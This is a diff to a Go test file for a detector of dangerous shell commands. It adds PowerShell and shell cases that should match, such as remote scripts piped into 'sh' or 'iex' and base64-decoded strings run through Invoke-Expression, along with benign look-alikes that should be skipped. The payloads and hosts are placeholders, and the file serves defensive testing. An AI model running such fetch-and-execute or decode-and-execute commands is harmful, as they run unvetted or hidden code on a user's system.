@@ -140,6 +140,17 @@ func TestCFG001Commands(t *testing.T) {
 		`irm https://e.example.invalid/p.ps1 | Out-String | Invoke-Expression`,
 		`iwr https://e.example.invalid/p.ps1 | iex`,
 		`curl http://[::1]:9000/x | sh`,
+		`echo aGk= | base64 -d | iex`,
+		`echo aGk= | base64 --decode | Invoke-Expression`,
+		`[Convert]::FromBase64String('QQ==') | iex`,
+		`FromBase64 'QQ==' | Invoke-Expression`,
+		`[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ==')) | iex`,
+		`[System.Text.Encoding]::Unicode.GetString($b) | Invoke-Expression`,
+		`iex ([Convert]::FromBase64String('QQ=='))`,
+		`powershell -NoProfile -c "[Convert]::FromBase64String('QQ==') | iex"`,
+		`powershell "[Text.Encoding]::UTF8.GetString($b) | Invoke-Expression"`,
+		`pwsh -NoProfile -c "echo aGk= | base64 -d | iex"`,
+		`pwsh "echo aGk= | base64 --decode | Invoke-Expression"`,
 	}
 	skip := []string{
 		`sudo apt-get install -y curl jq`,
@@ -190,7 +201,13 @@ func TestCFG001Commands(t *testing.T) {
 		`powershell -File ./scripts/iwr-wrapper.ps1 https://e.example.invalid/x`,
 		`pwsh -c "Get-ChildItem | Select-Object Name"`,
 		`pwsh -c "oh-my-posh init pwsh | Invoke-Expression"`,
+		`powershell -c "oh-my-posh init pwsh | Invoke-Expression"`,
+		`pwsh "oh-my-posh init pwsh | Invoke-Expression"`,
+		`powershell "Get-Content ./profile.ps1 | iex"`,
 		`(& uv generate-shell-completion powershell) | Out-String | Invoke-Expression`,
+		`pwsh -c "(& uv generate-shell-completion powershell) | Out-String | Invoke-Expression"`,
+		`powershell -c "base64 ./payload.txt | iex"`,
+		`echo 'base64 -d | iex'`,
 		`curl http://[::1]:9000/health`,
 	}
 	for _, command := range match {
